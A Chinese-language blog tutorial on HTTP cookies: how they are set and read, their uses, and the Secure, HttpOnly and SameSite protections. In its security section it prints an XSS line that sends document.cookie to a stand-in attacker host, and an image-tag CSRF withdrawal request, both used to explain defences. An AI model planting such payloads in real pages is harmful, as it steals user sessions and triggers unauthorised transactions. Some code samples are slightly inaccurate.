---
title: 管中窥豹看Cookie
date: 2019-04-09 21:14:04
tags: http
dir: http
keywords:
  - http
  - cookie
---

本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的[详细参数](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)。

## Cookie介绍

以下Wikipedia、MDN对cookie的介绍

> **Wikipedia:**
>
> Cookie（复数形态Cookies），又称为“小甜饼”。类型为“**小型文本文件**”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。
>
> **MDN:**
>
> HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。

**划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态**

Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。

<div style="width: 80%; margin: 0 auto;text-align:center">![cookies消息传递](exchange-cookies.png)Cookies的传输</div>

**注意**：_Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。_


## Cookie的特性

### 前端数据存储及读写

Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie
[document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)
```javascript
// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式
// 可设置path，domain，max-age，expires，secure

// 增加cookie
document.cookie = `someCookieName=true; expires=${new Date().toGMTString() + 1}; path=/`
// 删除cookie 通过设置过去的时间删除cookie
document.cookie = `someCookieName=true; expires=${new Date().toGMTString() - 1}; path=/`
// 修改cookie
document.cookie = `someCookieName=false; expires=${new Date().toGMTString() + 1}; path=/`
// 查找cookie
new RegExp("(?:^|;\\s*)" + encodeURIComponent("需要查找的cookie").replace(/[-.+*]/g, "\\$&") + "\\s*\\=")).test(document.cookie)
```

### 后端通过http头设置

后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie[参数](https://github.com/pillarjs/cookies)
```javascript
// 以nodejs为例
// 获取
response.getHeader("Cookie");
// 设置
response.setHeader("Cookie", ["name=gdccwxx"]);

// 以koa为例
// 获取
ctx.cookies.get(name, [options])
// 设置
ctx.cookies.set(name, value, [options])
```

### 请求时通过http头传给后端

以Google键入请求为例
<div style="width: 80%; margin: 0 auto;text-align:center">![请求Google](font-transfer-cookie.png)请求通过http头传送给后端</div>

### 遵守同源策略

Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。
Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（**不包含子域名**）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。

## Cookie作用及用途

### Cookie的作用

**存储个性化设置**
即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。
<div style="width: 80%; margin: 0 auto; text-align: center">
	![在主页的cookie](out-path-cookie.png)
</br>
  在google.com的cookie
</br>
  ![在搜索的cookie](in-path-cookie.png)
</br>
  在google.com/search的cookie
</br>
</div>

正因为cookie的作用域，使得cookie存储有着多样性。

**存储未登陆时用户唯一标识**

在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。
具体操作：
1、向未登陆的用户发送一个唯一的标识。
2、保留唯一标识所做的事情。
3、用户登录后关联账户及唯一标识所做的事情。

以新浪微博为例：
<div style="width: 80%; margin: 0 auto; text-align: center">
![未登陆状态下的cookie](unlogin-cookie.png)
</br>
未登录状态下的cookie：login_sid_t表示唯一标识
</div>

通过唯一标识与登录态的绑定，可建立游客态与用户态的关联

**存储已经登陆用户的凭证**
cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。

**存储其他业务数据**
可存储其他业务信息，例如用户生日等

### Cookie的用途

了解Cookie的作用后，其主要用途是以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

## Cookie 的安全策略

### Cookie与XSS的关系

在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码
```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

这种情况下的cookie则会发送到攻击者的网站。

#### 分析XSS攻击：

* 会话被劫持
* 通过document获取cookie

#### 解决办法：

* 会话劫持：使用cookie中Secure标识
* 不被JavaScript调用cookie：使用cookie中HttpOnly标识

#### 参数介绍

**Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）**

> 一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。

用法：

```javascript
Set-Cookie: name=gdccwxx; secure
```

**HttpOnly**

> 设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  `Document.cookie` 属性、`XMLHttpRequest` 和  `Request`APIs 进行访问，以防范跨站脚本攻击（XSS）。

用法：

```javascript
Set-Cookie: name=gdccwxx; HttpOnly
```

### Cookie与CSRF的关系

CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。
以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：
```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。

#### 分析CSRF攻击

* 被攻击者本地Cookie信息没有过期
* 银行转账系统无二次确认，直接转账
* 第三方网站（不安全的聊天室或论坛）加载请求
* 攻击者无法读写Cookie

#### 解决办法

* 敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间
* 增加二次确认：目标网站对敏感操作无二次确认
* 不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。
* 允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识

#### 参数介绍

**SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）**

> 允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。

用法：

```javascript
Set-Cookie: name=gdccwxx; SameSite // default SameSite=Strict
Set-Cookie: name=gdccwxx; SameSite=Lax
```

| **请求类型** | **例子**                          | **非 SameSit** | **SameSite = Lax** | **SameSite = Strict** |
| :----------- | --------------------------------- | -------------- | ------------------ | --------------------- |
| link         | <a href="…"\>                     | Y              | Y                  | N                     |
| prerender    | \<link rel="prerender" href="…"\> | Y              | Y                  | N                     |
| form get     | <form method="get" action="…"\>   | Y              | Y                  | N                     |
| form post    | <form method="post" action="…"\>  | Y              | N                  | N                     |
| iframe       | <iframe src="…"\>                 | Y              | N                  | N                     |
| ajax         | $.get('…')                        | Y              | N                  | N                     |
| image        | <img src="…"\>                    | Y              | N                  | N                     |



## 要点总结：

* **Cookie是服务器保存在本地的数据块**
* **每次请求都会包含cookie，因此会比较浪费资源**
* **使用document.cookie可访问非HttpOnly的cookie**
* **删除本地cookie只能通过给cookie设置过去的Expire删除**
* **常用鉴别用户身份的方法是给cookie设置签名或token**
* **为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer**